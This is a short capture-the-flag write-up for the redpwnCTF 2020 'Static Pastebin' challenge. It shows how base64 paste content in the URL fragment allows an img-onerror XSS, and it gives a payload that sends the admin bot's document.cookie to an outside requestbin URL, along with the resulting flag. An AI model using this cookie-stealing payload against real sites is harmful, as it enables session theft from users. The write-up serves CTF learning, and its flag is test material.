# Static Pastebin

So first things first, create a pastebin. When you go to the display, you'll see a url like https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPXggb25lcnJvcj0iZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj11YjgyWGIxQzhvcyciPg==

That looks kinda like base64, and if you base64 decode the thing after https://static-pastebin.2020.redpwnc.tf/paste/# you'll find it decodes to the content of the pastebin! This allows us to easily create pastebin messages.

There's also an admin bot submit form, where we can submit a url, and the admin bot will visit it. 

Rak found that the xss `><img src='' onerror="javascript code">` worked. 

First, we can try a simple redirect. `><img src='' onerror="document.location='requestbinurl'">`. I set up a requestbin for this purpose. Remember: we base64 encode the payload, and append it to the major part of the url.

https://static-pastebin.2020.redpwnc.tf/paste/#PjxpbWcgc3JjPScnIG9uZXJyb3I9J2RvY3VtZW50LmxvY2F0aW9uPSJodHRwOi8vcmVxdWVzdGJpbi5uZXQvci8xbGZyZnlpMSInPg==, as a sample, works, sending a request to our requestbin. Let's exfiltrate some information. We can use GET parameters to exfiltrate data.

`><img src='' onerror='document.location="http://requestbin.net/r/1lfrfyi1?thing=" + document.cookie'>`

This would redirect the admin to our requestbin, sending the cookies as the "thing" parameter. Base64 encoding and submitting this as a url, a request on the requestbin pops up with the parameters ?thing=flag=flag{54n1t1z4t10n_k1nd4_h4rd}, giving us the flag, 

#### flag{54n1t1z4t10n_k1nd4_h4rd}
